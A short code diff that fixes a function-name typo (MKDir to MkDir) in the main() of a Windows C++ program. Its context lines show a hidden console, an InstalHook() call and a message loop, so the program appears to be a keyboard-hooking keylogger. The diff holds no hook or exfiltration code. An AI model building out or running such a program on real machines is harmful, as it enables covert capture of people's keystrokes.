@@ -16,7 +16,7 @@ int main()
 {
    //disable console screen
     MSG Msg;
-    IO::MKDir(IO::GetOurPath(true));
+    IO::MkDir(IO::GetOurPath(true));
     InstalHook();
     while(GetMessage (&Msg, NULL, 0, 0))
     {
